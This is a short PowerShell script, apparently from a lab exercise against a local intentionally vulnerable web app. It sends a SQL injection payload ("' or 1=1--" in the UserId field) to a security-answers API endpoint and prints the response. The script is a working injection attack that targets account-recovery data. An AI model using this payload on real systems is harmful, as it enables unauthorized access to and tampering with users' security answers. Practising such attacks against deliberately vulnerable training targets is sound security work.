$url = 'http://localhost:3000/api/SecurityAnswers/'
$payload = @{
    'answer' = 'somebody'
    'SecurityQuestionId' = 2
    'UserId' = "' or 1=1--"
}
$secQResponse = $null
$secQResponse = Invoke-RestMethod -Method Post -Uri $url -Body $payload
$secQs = $secQResponse.data
$secQs